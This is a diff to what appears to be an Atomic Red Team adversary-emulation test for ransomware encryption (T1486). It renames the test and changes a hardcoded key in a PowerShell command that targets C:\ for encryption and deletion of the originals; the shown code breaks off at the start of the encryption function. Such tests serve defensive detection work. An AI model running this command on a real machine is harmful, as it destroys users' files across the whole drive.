@@ -1,15 +1,15 @@
 attack_technique: T1486
 display_name: Data Encrypted for Impact
 atomic_tests:
-- name: Encrypt Files on C Drive
-  description: Simulates a ransomware attack by encrypting files on C:\ and deleting originals.
+- name: Encrypt and Delete Files on C Drive
+  description: Simulates a ransomware attack by encrypting all files on C:\ and deleting originals.
   supported_platforms:
     - windows
   executor:
     name: powershell
     command: |
       $targetDirectory = "C:\\"
-      $key = "MySecretKey123" # Clé de chiffrement
+      $key = "MySecretEncryptionKey123" # Clé de chiffrement (peut être modifiée)
 
       function Encrypt-File {
           param (
